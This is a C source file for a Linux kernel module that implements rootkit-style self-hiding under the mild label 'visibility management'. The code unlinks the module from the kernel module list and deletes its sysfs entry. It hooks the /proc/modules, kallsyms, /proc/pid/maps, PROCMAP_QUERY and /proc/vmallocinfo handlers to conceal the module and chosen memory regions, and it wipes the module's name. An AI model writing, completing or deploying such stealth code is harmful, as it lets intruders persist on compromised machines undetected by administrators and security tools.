/* SPDX-License-Identifier: GPL-2.0 */
/* nvk_vis.c — Module visibility management (list, sysfs, proc, kallsyms, vmalloc). */
#include <nvk.h>
#include <linux/fs.h>
#include "nvk_internal.h"
#include "nvk_vis_list.h"
#include "nvk_vis_seq.h"
#include "nvk_vis_vmalloc.h"

static __always_inline int _neverc_krt_str_starts_with(const char *str,
						       const char *prefix)
{
	while (*prefix) {
		if (*str != *prefix) return 0;
		str++;
		prefix++;
	}
	return 1;
}

static struct neverc_krt_interpose _neverc_krt_ks_interpose;
static int _neverc_krt_ks_interposed;
static struct neverc_krt_interpose _neverc_krt_vmalloc_interpose;
static int _neverc_krt_vmalloc_interposed;
static struct neverc_krt_interpose _neverc_krt_maps_interpose;
static struct neverc_krt_interpose _neverc_krt_maps_ioctl_interpose;
static void *_neverc_krt_maps_seq_operations;

static __always_inline struct list_head *
_neverc_krt_get_mod_list(struct neverc_krt_this_module *mod)
{
	const struct neverc_krt_gki_layout *layout =
		_neverc_krt_get_proven_gki_layout(NEVERC_KRT_LAYOUT_CERT_FULL);

	return layout && mod ? (struct list_head *)((char *)mod +
		layout->module_list) : (struct list_head *)0;
}

/* ---- internal typedefs ---- */

typedef void (*neverc_krt_mutex_lock_fn)(void *);
typedef void (*neverc_krt_mutex_unlock_fn)(void *);
typedef void (*neverc_krt_kobject_del_fn)(void *kobj);
typedef int  (*neverc_krt_mod_seq_show_fn)(void *seq, void *v);
typedef int  (*neverc_krt_mod_addr_fn)(unsigned long addr);
typedef int  (*neverc_krt_vmalloc_show_fn)(void *seq, void *v);
typedef long (*neverc_krt_maps_ioctl_fn)(
	void *file, unsigned int command, unsigned long argument);

/* ---- internal variables ---- */

static struct neverc_krt_maps_filter_region
	_neverc_krt_maps_regions[NEVERC_KRT_VIS_MAPS_FILTER_MAX];
static int _neverc_krt_maps_region_count;
static int _neverc_krt_maps_region_owned_count;

static neverc_krt_mutex_lock_fn   _neverc_krt_vis_mutex_lock;
static neverc_krt_mutex_unlock_fn _neverc_krt_vis_mutex_unlock;
static void                      *_neverc_krt_module_mutex;
static struct list_head          *_neverc_krt_modules;
static neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
static int                        _neverc_krt_vis_inited;

static neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
static const char                *_neverc_krt_vis_target_name;
static struct neverc_krt_vis_state *_neverc_krt_proc_state;

static neverc_krt_mod_addr_fn     _neverc_krt_orig_mod_text_addr;
static unsigned long              _neverc_krt_vis_mod_start;
static unsigned long              _neverc_krt_vis_mod_end;
static struct neverc_krt_vis_state *_neverc_krt_ks_state;

static neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
static neverc_krt_mod_seq_show_fn _neverc_krt_orig_maps_show;
static neverc_krt_maps_ioctl_fn   _neverc_krt_orig_maps_ioctl;
static struct neverc_krt_vmalloc_range
	_neverc_krt_vmalloc_ranges[NEVERC_KRT_VMALLOC_RANGE_MAX];
static int _neverc_krt_vmalloc_range_count;

/* ==================================================================== */
/*  Init / module list visibility filter apply/restore              */
/* ==================================================================== */

static void _neverc_krt_vis_lock(void)
{
	if (_neverc_krt_vis_mutex_lock && _neverc_krt_module_mutex)
		_neverc_krt_vis_mutex_lock(_neverc_krt_module_mutex);
}

static void _neverc_krt_vis_unlock(void)
{
	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
}

int neverc_krt_vis_init(void)
{
	if (_neverc_krt_vis_inited) return 0;

	(void)neverc_krt_mem_init();
	(void)neverc_krt_compat_init();

	_neverc_krt_vis_mutex_lock =
		(neverc_krt_mutex_lock_fn)NEVERC_KRT_LOOKUP("mutex_lock");
	_neverc_krt_vis_mutex_unlock =
		(neverc_krt_mutex_unlock_fn)NEVERC_KRT_LOOKUP("mutex_unlock");
	_neverc_krt_module_mutex = (void *)NEVERC_KRT_LOOKUP("module_mutex");
	_neverc_krt_modules =
		(struct list_head *)NEVERC_KRT_LOOKUP("modules");
	_neverc_krt_kobject_del =
		(neverc_krt_kobject_del_fn)NEVERC_KRT_LOOKUP("kobject_del");

	_neverc_krt_vis_inited = 1;
	return 0;
}

int neverc_krt_vis_filter(struct neverc_krt_vis_state *state,
			  struct neverc_krt_this_module *mod)
{
	struct list_head *our;
	struct list_head *saved_next;
	struct list_head *saved_prev;
	int ret;

	if (!_neverc_krt_vis_inited)
		return -EAGAIN;
	if (!state || !mod)
		return -EINVAL;
	if (state->filtered)
		return 0;

	our = _neverc_krt_get_mod_list(mod);
	if (!our)
		return -EOPNOTSUPP;

	_neverc_krt_vis_lock();
	ret = _neverc_krt_vis_list_unlink(
		our, &saved_prev, &saved_next);
	_neverc_krt_vis_unlock();
	if (ret)
		return ret;
	state->saved_next = saved_next;
	state->saved_prev = saved_prev;
	state->filtered = 1;
	return 0;
}

int neverc_krt_vis_restore(struct neverc_krt_vis_state *state,
			   struct neverc_krt_this_module *mod)
{
	struct list_head *our;
	int ret;

	if (!state || !mod)
		return -EINVAL;
	if (!state->filtered)
		return 0;
	if (!_neverc_krt_vis_inited)
		return -EAGAIN;

	our = _neverc_krt_get_mod_list(mod);
	if (!our)
		return -EOPNOTSUPP;

	_neverc_krt_vis_lock();
	if (state->saved_prev && state->saved_next)
		ret = _neverc_krt_vis_list_restore_neighbors(
			our, state->saved_prev, state->saved_next);
	else if (_neverc_krt_modules)
		ret = _neverc_krt_vis_list_restore(_neverc_krt_modules, our);
	else
		ret = -EAGAIN;
	_neverc_krt_vis_unlock();
	if (ret)
		return ret;
	state->filtered = 0;
	state->saved_next = (struct list_head *)0;
	state->saved_prev = (struct list_head *)0;
	return 0;
}

int neverc_krt_vis_is_filtered(const struct neverc_krt_vis_state *state)
{
	return state ? state->filtered : 0;
}

/* ==================================================================== */
/*  Sysfs removal                                                       */
/* ==================================================================== */

int neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
				struct neverc_krt_this_module *mod)
{
	const struct neverc_krt_gki_layout *layout;
	unsigned long name;
	void *kobj;

	if (!state || !mod)
		return -EINVAL;
	if (state->sysfs_removed)
		return 0;
	if (!_neverc_krt_kobject_del)
		return -EOPNOTSUPP;

	layout = _neverc_krt_get_proven_gki_layout(NEVERC_KRT_LAYOUT_CERT_FULL);
	if (!layout)
		return -EOPNOTSUPP;
	kobj = (unsigned char *)mod + layout->module_kobj;
	if (neverc_krt_mem_read(
		    &name, (unsigned char *)kobj + layout->kobject_name,
		    sizeof(name)) ||
	    name < 0xFFFF000000000000UL ||
	    name >= 0xFFFFFFFFFFFFF000UL)
		return -EFAULT;

	_neverc_krt_kobject_del(kobj);
	state->saved_kobj = kobj;
	state->sysfs_removed = 1;
	return 0;
}

/* ==================================================================== */
/*  /proc/modules seq_show filter                                       */
/* ==================================================================== */

static int _neverc_krt_mod_seq_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_mod_seq_show)
		return 0;

	if (v && _neverc_krt_vis_target_name) {
		const struct neverc_krt_gki_layout *layout =
			_neverc_krt_get_proven_gki_layout(
				NEVERC_KRT_LAYOUT_CERT_FULL);
		unsigned long list_addr = (unsigned long)v;
		if (layout && list_addr >= 0xFFFF000000000000UL &&
		    list_addr < 0xFFFFFFFFFFFFF000UL) {
			unsigned long mod_base = list_addr - layout->module_list;
			char nbuf[64];
			if (!neverc_krt_mem_read(
				    nbuf,
				    (void *)(mod_base + layout->module_name),
				    sizeof(nbuf)) &&
			    nbuf[0] >= 0x20 && nbuf[0] <= 0x7E) {
				nbuf[sizeof(nbuf) - 1] = '\0';
				if (_neverc_krt_str_starts_with(nbuf,
							 _neverc_krt_vis_target_name))
					return 0;
			}
		}
	}

	return _neverc_krt_orig_mod_seq_show(seq, v);
}

int neverc_krt_vis_proc_filter(struct neverc_krt_vis_state *state,
			       const char *module_name)
{
	void *target;

	if (!state || !module_name)
		return -EINVAL;
	if (state->seq_show_interposed) return 0;
	if (_neverc_krt_proc_state)
		return -EBUSY;

	target = _neverc_krt_resolve_modules_show();
	if (!target) return -EOPNOTSUPP;

	state->module_name = module_name;
	_neverc_krt_vis_target_name = module_name;

	int ret = neverc_krt_interpose_install(&state->seq_show_interpose, target,
				   (void *)_neverc_krt_mod_seq_show_filter,
				   (void **)&_neverc_krt_orig_mod_seq_show);
	if (ret) {
		_neverc_krt_vis_target_name = (const char *)0;
		state->module_name = (const char *)0;
		return ret;
	}

	state->seq_show_interposed = 1;
	_neverc_krt_proc_state = state;
	return 0;
}

/* ==================================================================== */
/*  Kallsyms address filter                                             */
/* ==================================================================== */

static int _neverc_krt_mod_text_addr_filter(unsigned long addr)
{
	if (addr >= _neverc_krt_vis_mod_start && addr < _neverc_krt_vis_mod_end)
		return 0;
	if (_neverc_krt_orig_mod_text_addr)
		return _neverc_krt_orig_mod_text_addr(addr);
	return 0;
}

int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
				   const char *module_name)
{
	void *target;

	if (!state || !module_name)
		return -EINVAL;
	if (state->kallsyms_filtered) return 0;
	if (_neverc_krt_ks_interposed)
		return -EBUSY;

	target = NEVERC_KRT_LOOKUP("is_module_text_address");
	if (!target)
		target = NEVERC_KRT_LOOKUP("__module_text_address");
	if (!target) return -EOPNOTSUPP;

	unsigned char *mod_base = (unsigned char *)&__this_module;
	_neverc_krt_vis_mod_start = (unsigned long)mod_base;
	_neverc_krt_vis_mod_end = _neverc_krt_vis_mod_start + _neverc_krt_get_module_size();

	int ret = neverc_krt_interpose_install(&_neverc_krt_ks_interpose, target,
				   (void *)_neverc_krt_mod_text_addr_filter,
				   (void **)&_neverc_krt_orig_mod_text_addr);
	if (ret) return ret;

	_neverc_krt_ks_interposed = 1;
	_neverc_krt_ks_state = state;
	state->kallsyms_filtered = 1;
	return 0;
}

/* ==================================================================== */
/*  Composite full visibility filter + cleanup                          */
/* ==================================================================== */

static int _neverc_krt_vis_proc_remove(
	struct neverc_krt_vis_state *state)
{
	int ret;

	if (!state || !state->seq_show_interposed)
		return 0;
	ret = neverc_krt_interpose_remove(&state->seq_show_interpose);
	if (ret)
		return ret;
	state->seq_show_interposed = 0;
	state->module_name = (const char *)0;
	_neverc_krt_orig_mod_seq_show =
		(neverc_krt_mod_seq_show_fn)0;
	_neverc_krt_vis_target_name = (const char *)0;
	if (_neverc_krt_proc_state == state)
		_neverc_krt_proc_state =
			(struct neverc_krt_vis_state *)0;
	return 0;
}

static int _neverc_krt_vis_ks_remove(
	struct neverc_krt_vis_state *state)
{
	int ret;

	if (!state || !state->kallsyms_filtered)
		return 0;
	ret = neverc_krt_interpose_remove(&_neverc_krt_ks_interpose);
	if (ret)
		return ret;
	state->kallsyms_filtered = 0;
	_neverc_krt_ks_interposed = 0;
	_neverc_krt_orig_mod_text_addr =
		(neverc_krt_mod_addr_fn)0;
	if (_neverc_krt_ks_state == state)
		_neverc_krt_ks_state =
			(struct neverc_krt_vis_state *)0;
	return 0;
}

int neverc_krt_vis_filter_full(struct neverc_krt_vis_state *state,
			       struct neverc_krt_this_module *mod,
			       const char *module_name)
{
	int installed_proc;
	int installed_ks;
	int filtered;
	int ret;
	int rollback;

	if (!state || !mod || !module_name)
		return -EINVAL;
	installed_proc = !state->seq_show_interposed;
	installed_ks = !state->kallsyms_filtered;
	filtered = !state->filtered;

	ret = neverc_krt_vis_proc_filter(state, module_name);
	if (ret)
		return ret;
	ret = neverc_krt_vis_kallsyms_filter(state, module_name);
	if (ret)
		goto rollback_proc;
	ret = neverc_krt_vis_filter(state, mod);
	if (ret)
		goto rollback_ks;
	ret = neverc_krt_vis_sysfs_remove(state, mod);
	if (!ret)
		return 0;

	if (filtered) {
		rollback = neverc_krt_vis_restore(state, mod);
		if (rollback)
			return rollback;
	}
rollback_ks:
	if (installed_ks) {
		rollback = _neverc_krt_vis_ks_remove(state);
		if (rollback)
			return rollback;
	}
rollback_proc:
	if (installed_proc) {
		rollback = _neverc_krt_vis_proc_remove(state);
		if (rollback)
			return rollback;
	}
	return ret;
}

/* ==================================================================== */
/*  /proc/pid/maps VMA range filter                                    */
/* ==================================================================== */

static int _neverc_krt_maps_filter_add_region(
	unsigned long start, unsigned long end, void *mm_identity)
{
	int idx;

	/* Region slots are immutable while either reader hook is live. */
	if (_neverc_krt_maps_interpose.active ||
	    _neverc_krt_maps_ioctl_interpose.active)
		return -EBUSY;
	if (start >= end)
		return -EINVAL;
	idx = __atomic_load_n(
		&_neverc_krt_maps_region_count, __ATOMIC_ACQUIRE);
	if (idx >= NEVERC_KRT_VIS_MAPS_FILTER_MAX)
		return -ENOSPC;
	_neverc_krt_maps_regions[idx].start = start;
	_neverc_krt_maps_regions[idx].end = end;
	_neverc_krt_maps_regions[idx].mm_identity = mm_identity;
	_neverc_krt_maps_region_owned_count = idx + 1;
	__atomic_store_n(
		&_neverc_krt_maps_region_count, idx + 1, __ATOMIC_RELEASE);
	return 0;
}

int neverc_krt_vis_maps_filter_add(unsigned long start, unsigned long end)
{
	return _neverc_krt_maps_filter_add_region(
		start, end, (void *)0);
}

int neverc_krt_vis_maps_filter_add_task(
	struct task_struct *task, unsigned long start, unsigned long end)
{
	void *mm_identity;
	int ret;

	if (!task)
		return -EINVAL;
	mm_identity = neverc_krt_task_mm_get(task);
	if (!mm_identity)
		return -EOPNOTSUPP;
	ret = _neverc_krt_maps_filter_add_region(
		start, end, mm_identity);
	if (ret)
		neverc_krt_task_mm_put(mm_identity);
	return ret;
}

int neverc_krt_vis_maps_should_filter(unsigned long addr)
{
	int count = __atomic_load_n(
		&_neverc_krt_maps_region_count, __ATOMIC_ACQUIRE);

	/*
	 * This legacy helper has no task/mm parameter, so only global rules can
	 * answer it without turning a process-scoped range into a global one.
	 */
	return _neverc_krt_maps_global_address_should_hide(
		addr, _neverc_krt_maps_regions, count);
}

static void _neverc_krt_vis_maps_regions_release(void)
{
	int i;

	for (i = 0; i < _neverc_krt_maps_region_owned_count; i++) {
		if (_neverc_krt_maps_regions[i].mm_identity)
			neverc_krt_task_mm_put(
				_neverc_krt_maps_regions[i].mm_identity);
		_neverc_krt_maps_regions[i].start = 0;
		_neverc_krt_maps_regions[i].end = 0;
		_neverc_krt_maps_regions[i].mm_identity = (void *)0;
	}
	_neverc_krt_maps_region_owned_count = 0;
}

void neverc_krt_vis_maps_filter_clear(void)
{
	__atomic_store_n(
		&_neverc_krt_maps_region_count, 0, __ATOMIC_RELEASE);
	if (!_neverc_krt_maps_interpose.active &&
	    !_neverc_krt_maps_ioctl_interpose.active)
		_neverc_krt_vis_maps_regions_release();
}

void neverc_krt_vis_maps_filter_add_self(void)
{
	unsigned char *mod_base = (unsigned char *)&__this_module;
	unsigned long start = (unsigned long)mod_base;
	unsigned long end = start + _neverc_krt_get_module_size();
	neverc_krt_vis_maps_filter_add(start, end);
}

static int _neverc_krt_maps_show_filter(void *seq, void *v)
{
	int range_count = __atomic_load_n(
		&_neverc_krt_maps_region_count, __ATOMIC_ACQUIRE);

	if (!_neverc_krt_orig_maps_show)
		return 0;

	if (v && range_count > 0) {
		const struct neverc_krt_gki_layout *layout =
			_neverc_krt_get_proven_gki_layout(
				NEVERC_KRT_LAYOUT_CERT_FULL);

		if (layout &&
		    layout->vma_start_size == sizeof(unsigned long) &&
		    layout->vma_end_size == sizeof(unsigned long) &&
		    _neverc_krt_maps_vma_should_hide(
			    v, layout->vma_size, layout->vma_start,
			    layout->vma_end, layout->vma_mm,
			    _neverc_krt_maps_regions, range_count))
			return 0;
	}

	return _neverc_krt_orig_maps_show(seq, v);
}

static long _neverc_krt_maps_ioctl_filter(
	void *file, unsigned int command, unsigned long argument)
{
	struct neverc_krt_maps_ioctl_layout ioctl_layout;
	int range_count = __atomic_load_n(
		&_neverc_krt_maps_region_count, __ATOMIC_ACQUIRE);
	void *maps_operations = (void *)0;
	void *target_mm = (void *)0;
	int target_mm_known = 0;

	/*
	 * Binary PROCMAP_QUERY bypasses seq_operations.show on Linux 6.12+.
	 * Resolve the maps file's referenced mm from the family-table
	 * private layouts so a process-scoped rule does not disable unrelated
	 * processes.  If a COMPAT kernel changes those private layouts, the
	 * query is left alone unless a global rule is present.
	 */
	if (command == NEVERC_KRT_PROCMAP_QUERY && range_count > 0) {
		const struct neverc_krt_runtime_caps *caps =
			_neverc_krt_current_caps();

		maps_operations = __atomic_load_n(
			&_neverc_krt_maps_seq_operations, __ATOMIC_ACQUIRE);
		if (caps &&
		    !_neverc_krt_maps_ioctl_layout_from_caps(
			    caps, &ioctl_layout) &&
		    !_neverc_krt_maps_ioctl_target_mm(
			    file, maps_operations, &ioctl_layout, &target_mm))
			target_mm_known = 1;
	}
	if (_neverc_krt_maps_ioctl_should_block(
		    command, _neverc_krt_maps_regions, range_count,
		    target_mm, target_mm_known))
		return -ENOTTY;
	if (!_neverc_krt_orig_maps_ioctl)
		return -ENOTTY;
	return _neverc_krt_orig_maps_ioctl(file, command, argument);
}

static int _neverc_krt_maps_release_interpose(
	struct neverc_krt_interpose *handle, void **orig)
{
	int ret;

	if (!handle->active) {
		if (orig)
			*orig = (void *)0;
		return 0;
	}
	ret = neverc_krt_interpose_remove(handle);
	if (!ret && orig)
		*orig = (void *)0;
	return ret;
}

int neverc_krt_vis_maps_filter_install(void)
{
	const struct neverc_krt_runtime_caps *caps;
	void *ioctl_target = (void *)0;
	void *show_target;
	int ioctl_required = 0;
	int ioctl_rollback;
	int range_count;
	int rollback;
	int ret;

	show_target = _neverc_krt_resolve_maps_show();
	if (!show_target)
		return -1;
	caps = _neverc_krt_current_caps();
	if (caps)
		ioctl_required = _neverc_krt_maps_ioctl_required(
			caps->procmap_ioctl_layout);

	if (_neverc_krt_maps_interpose.active ||
	    _neverc_krt_maps_ioctl_interpose.active) {
		if (_neverc_krt_maps_interpose.active &&
		    READ_ONCE(_neverc_krt_maps_interpose.enabled) &&
		    (!ioctl_required ||
		     (_neverc_krt_maps_ioctl_interpose.active &&
		      READ_ONCE(_neverc_krt_maps_ioctl_interpose.enabled))))
			return 0;
		return -EUCLEAN;
	}
	range_count = __atomic_load_n(
		&_neverc_krt_maps_region_count, __ATOMIC_ACQUIRE);
	if (range_count <= 0)
		return -EINVAL;
	if (!_neverc_krt_maps_ioctl_install_allowed(
		    ioctl_required, _neverc_krt_maps_regions, range_count))
		return -EINVAL;
	if (ioctl_required) {
		ioctl_target = _neverc_krt_resolve_maps_ioctl(
			__builtin_offsetof(struct file_operations,
					   unlocked_ioctl));
		if (!ioctl_target)
			return -EOPNOTSUPP;
	}

	ret = neverc_krt_interpose_install(&_neverc_krt_maps_interpose,
					   show_target,
					   (void *)_neverc_krt_maps_show_filter,
					   (void **)&_neverc_krt_orig_maps_show);
	if (ret) {
		if (!_neverc_krt_maps_interpose.active)
			_neverc_krt_orig_maps_show =
				(neverc_krt_mod_seq_show_fn)0;
		return ret;
	}

	if (!_neverc_krt_maps_should_install_ioctl(ioctl_required,
						   ioctl_target))
		return 0;

	__atomic_store_n(&_neverc_krt_maps_seq_operations,
			 _neverc_krt_resolve_maps_seq_operations(),
			 __ATOMIC_RELEASE);
	ret = neverc_krt_interpose_install(
		&_neverc_krt_maps_ioctl_interpose, ioctl_target,
		(void *)_neverc_krt_maps_ioctl_filter,
		(void **)&_neverc_krt_orig_maps_ioctl);
	if (!ret)
		return 0;

	/*
	 * E_PATCH can leave the ioctl handle active-but-disabled.  Drop it
	 * before rolling back show so a failed install does not keep a
	 * reader hook that cleanup would miss if the caller only retries.
	 */
	ioctl_rollback = _neverc_krt_maps_release_interpose(
		&_neverc_krt_maps_ioctl_interpose,
		(void **)&_neverc_krt_orig_maps_ioctl);
	if (!_neverc_krt_maps_ioctl_interpose.active)
		__atomic_store_n(&_neverc_krt_maps_seq_operations, (void *)0,
				 __ATOMIC_RELEASE);
	rollback = _neverc_krt_maps_release_interpose(
		&_neverc_krt_maps_interpose,
		(void **)&_neverc_krt_orig_maps_show);
	return _neverc_krt_maps_failed_second_hook_status(
		ret, ioctl_rollback, rollback);
}

void neverc_krt_vis_maps_filter_cleanup(void)
{
	(void)_neverc_krt_maps_release_interpose(
		&_neverc_krt_maps_ioctl_interpose,
		(void **)&_neverc_krt_orig_maps_ioctl);
	if (!_neverc_krt_maps_ioctl_interpose.active)
		__atomic_store_n(&_neverc_krt_maps_seq_operations, (void *)0,
				 __ATOMIC_RELEASE);
	(void)_neverc_krt_maps_release_interpose(
		&_neverc_krt_maps_interpose,
		(void **)&_neverc_krt_orig_maps_show);
	neverc_krt_vis_maps_filter_clear();
}

/* ==================================================================== */
/*  Modinfo wipe                                                        */
/* ==================================================================== */

void neverc_krt_vis_wipe_modinfo(struct neverc_krt_this_module *mod)
{
	const struct neverc_krt_gki_layout *layout =
		_neverc_krt_get_proven_gki_layout(NEVERC_KRT_LAYOUT_CERT_FULL);
	volatile unsigned char *p = (volatile unsigned char *)mod;
	unsigned long i;
	unsigned long name_start;

	if (!layout || !mod)
		return;
	name_start = layout->module_name;
	for (i = name_start; i < name_start + 56 && i < _neverc_krt_get_module_size(); i++)
		p[i] = 0;
}

/* ==================================================================== */
/*  /proc/vmallocinfo filter                                            */
/* ==================================================================== */

static int _neverc_krt_vmalloc_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_vmalloc_show) return 0;

	if (v && _neverc_krt_vmalloc_range_count > 0) {
		const struct neverc_krt_gki_layout *layout =
			_neverc_krt_get_proven_gki_layout(
				NEVERC_KRT_LAYOUT_CERT_FULL);
		unsigned long start = 0;
		unsigned long end = 0;
		int i;

		if (layout && !neverc_krt_mem_read(
			    &start, (const char *)v + layout->vmap_va_start,
			    sizeof(start)) &&
		    !neverc_krt_mem_read(
			    &end, (const char *)v + layout->vmap_va_end,
			    sizeof(end))) {
			for (i = 0; i < _neverc_krt_vmalloc_range_count; i++) {
				if (_neverc_krt_vmalloc_range_overlaps(
					    &_neverc_krt_vmalloc_ranges[i],
					    start, end))
					return 0;
			}
		}
	}

	return _neverc_krt_orig_vmalloc_show(seq, v);
}

static void *_neverc_krt_resolve_vmalloc_s_show(void)
{
	const struct neverc_krt_runtime_caps *caps = _neverc_krt_current_caps();

	if (!caps)
		return NULL;
	return _neverc_krt_resolve_vmalloc_show_backend(
		caps->vmalloc_visibility_backend);
}

int neverc_krt_vis_vmalloc_filter(void)
{
	const struct neverc_krt_profile *profile;
	int profile_id;
	void *target;
	int range_count;

	if (_neverc_krt_vmalloc_interposed) return 0;

	profile_id = _neverc_krt_current_profile_id();
	profile = profile_id < 0 ? NULL :
		neverc_krt_find_profile((unsigned int)profile_id);
	if (!profile)
		return -1;
	range_count = _neverc_krt_collect_module_vmalloc_ranges(
		&__this_module, profile->module_memory_offset,
		profile->module_memory_count, profile->module_memory_stride,
		profile->module_memory_base, profile->module_memory_size,
		_neverc_krt_vmalloc_ranges, NEVERC_KRT_VMALLOC_RANGE_MAX);
	if (range_count < 0)
		return -1;
	_neverc_krt_vmalloc_range_count = range_count;

	target = _neverc_krt_resolve_vmalloc_s_show();
	if (!target) {
		_neverc_krt_vmalloc_range_count = 0;
		return -1;
	}

	int ret = neverc_krt_interpose_install(&_neverc_krt_vmalloc_interpose, target,
				   (void *)_neverc_krt_vmalloc_show_filter,
				   (void **)&_neverc_krt_orig_vmalloc_show);
	if (_neverc_krt_interpose_install_is_owned(
		    ret, _neverc_krt_vmalloc_interpose.active))
		_neverc_krt_vmalloc_interposed = 1;
	if (ret) {
		if (!_neverc_krt_vmalloc_interpose.active) {
			_neverc_krt_vmalloc_range_count = 0;
			_neverc_krt_orig_vmalloc_show =
				(neverc_krt_vmalloc_show_fn)0;
		}
		return ret;
	}

	return 0;
}

/* ==================================================================== */
/*  Pause / remove interposes                                                */
/* ==================================================================== */

int neverc_krt_vis_pause_interposes(void)
{
	int ret = 0;
	int next;

	if (_neverc_krt_proc_state &&
	    _neverc_krt_proc_state->seq_show_interposed) {
		next = neverc_krt_interpose_pause(
			&_neverc_krt_proc_state->seq_show_interpose);
		if (next && !ret)
			ret = next;
	}
	if (_neverc_krt_vmalloc_interposed) {
		next = neverc_krt_interpose_pause(&_neverc_krt_vmalloc_interpose);
		if (next && !ret)
			ret = next;
	}
	if (_neverc_krt_maps_ioctl_interpose.active) {
		next = neverc_krt_interpose_pause(
			&_neverc_krt_maps_ioctl_interpose);
		if (next && !ret)
			ret = next;
	}
	if (_neverc_krt_maps_interpose.active) {
		next = neverc_krt_interpose_pause(&_neverc_krt_maps_interpose);
		if (next && !ret)
			ret = next;
	}
	if (_neverc_krt_ks_interposed) {
		next = neverc_krt_interpose_pause(&_neverc_krt_ks_interpose);
		if (next && !ret)
			ret = next;
	}
	return ret;
}

int neverc_krt_vis_remove_interposes(void)
{
	int ret = 0;
	int next;

	if (_neverc_krt_proc_state) {
		next = _neverc_krt_vis_proc_remove(
			_neverc_krt_proc_state);
		if (next && !ret)
			ret = next;
	}
	if (_neverc_krt_ks_state) {
		next = _neverc_krt_vis_ks_remove(_neverc_krt_ks_state);
		if (next && !ret)
			ret = next;
	}
	if (_neverc_krt_vmalloc_interposed) {
		next = neverc_krt_interpose_remove(
			&_neverc_krt_vmalloc_interpose);
		if (next && !ret) {
			ret = next;
		} else if (!next) {
			_neverc_krt_vmalloc_interposed = 0;
			_neverc_krt_vmalloc_range_count = 0;
			_neverc_krt_orig_vmalloc_show =
				(neverc_krt_vmalloc_show_fn)0;
		}
	}
	if (_neverc_krt_maps_ioctl_interpose.active) {
		next = neverc_krt_interpose_remove(
			&_neverc_krt_maps_ioctl_interpose);
		if (next && !ret) {
			ret = next;
		} else if (!next) {
			_neverc_krt_orig_maps_ioctl =
				(neverc_krt_maps_ioctl_fn)0;
			__atomic_store_n(&_neverc_krt_maps_seq_operations,
					 (void *)0, __ATOMIC_RELEASE);
		}
	}
	if (_neverc_krt_maps_interpose.active) {
		next = neverc_krt_interpose_remove(&_neverc_krt_maps_interpose);
		if (next && !ret) {
			ret = next;
		} else if (!next) {
			_neverc_krt_orig_maps_show =
				(neverc_krt_mod_seq_show_fn)0;
		}
	}
	if (!_neverc_krt_maps_ioctl_interpose.active &&
	    !_neverc_krt_maps_interpose.active)
		neverc_krt_vis_maps_filter_clear();
	return ret;
}
